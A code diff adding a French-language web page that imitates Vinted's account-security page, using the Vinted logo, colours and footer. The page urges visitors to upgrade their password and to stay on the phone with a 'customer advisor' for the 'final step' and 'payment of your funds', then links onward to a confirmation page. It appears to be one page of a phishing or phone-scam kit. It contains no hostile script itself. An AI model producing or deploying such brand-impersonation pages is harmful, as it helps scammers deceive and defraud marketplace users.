@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vinted - Sécurité du Compte</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+        .container {
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 600px;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+            text-align: center;
+            margin: 15px auto;
+            box-sizing: border-box;
+            max-height: calc(100vh - 30px);
+            overflow-y: auto;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            max-width: 140px;
+            height: auto;
+            border: 0;
+        }
+        h1 {
+            font-size: 1.8em;
+            color: #007b76; /* Couleur corrigée pour correspondre au bouton */
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        .section-text {
+            font-size: 0.95em;
+            line-height: 1.5;
+            margin-bottom: 15px;
+            color: #444;
+        }
+        .highlight {
+            font-weight: bold;
+            color: #007b76;
+        }
+        .advisor-note {
+            background-color: #e9f5f5;
+            border-left: 5px solid #007b76;
+            padding: 12px 18px;
+            margin: 18px 0;
+            font-size: 0.95em;
+            color: #333;
+            text-align: left;
+            border-radius: 5px;
+            line-height: 1.4;
+        }
+        .danger-box {
+            background-color: #fef0f0;
+            border: 1px solid #dc3545;
+            border-radius: 8px;
+            padding: 15px 18px;
+            margin-top: 25px;
+            margin-bottom: 20px;
+            color: #dc3545;
+            text-align: left;
+            box-shadow: 0 2px 8px rgba(220, 53, 69, 0.1);
+        }
+        .danger-box h3 {
+            color: #dc3545;
+            margin-top: 0;
+            margin-bottom: 10px;
+            font-size: 1.05em;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+        }
+        .danger-box h3 .icon {
+            margin-right: 8px;
+            font-size: 1.2em;
+        }
+        .danger-box ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .danger-box ul li {
+            position: relative;
+            padding-left: 20px;
+            margin-bottom: 6px;
+            line-height: 1.3;
+            font-size: 0.85em;
+            font-weight: 500;
+        }
+        .danger-box ul li:last-child {
+            margin-bottom: 0;
+        }
+        .danger-box ul li:before {
+            content: '🚨';
+            position: absolute;
+            left: 0;
+            top: 0.1em;
+            font-size: 0.8em;
+        }
+        .button {
+            display: inline-block;
+            padding: 12px 30px;
+            font-size: 1.05em;
+            color: #ffffff;
+            background-color: #007b76;
+            border: none;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 25px;
+            box-shadow: 0 4px 15px rgba(0, 123, 118, 0.3);
+        }
+        .button:hover {
+            background-color: #00605c;
+            transform: translateY(-2px);
+        }
+        footer {
+            text-align: center;
+            padding: 10px 0;
+            color: #777;
+            font-size: 0.8em;
+            width: 100%;
+            margin-top: auto;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+                margin: 10px auto;
+            }
+            h1 {
+                font-size: 1.6em;
+            }
+            .section-text, .advisor-note, .danger-box ul li {
+                font-size: 0.9em;
+            }
+            .advisor-note, .danger-box {
+                padding: 10px 15px;
+            }
+            .danger-box h3 {
+                font-size: 1em;
+            }
+            .button {
+                padding: 10px 20px;
+                font-size: 0.95em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
+        </div>
+        <h1>Mise à jour de votre mot de passe requise</h1>
+
+        <div class="advisor-note">
+            <strong>📞 Veuillez rester en ligne avec votre conseiller client :</strong> il vous guidera personnellement pour cette étape finale cruciale et le versement de vos fonds.
+        </div>
+
+        <p class="section-text">
+            Pour des raisons de sécurité, nous avons détecté qu'il est nécessaire de renforcer la protection de votre compte. Cette étape garantit la sécurité de vos informations et de vos transactions en cours.
+        </p>
+
+        <!-- Le bouton redirige maintenant vers la page de confirmation d'email -->
+<a href="password_update_sent.html" class="button">J'augmente le niveau de sécurité de mon mot de passe</a>    </div>
+
+    <footer>
+        <p>&copy; 2025 Vinted - La mode d'occasion, repensée.</p>
+    </footer>
+</body>
+</html>
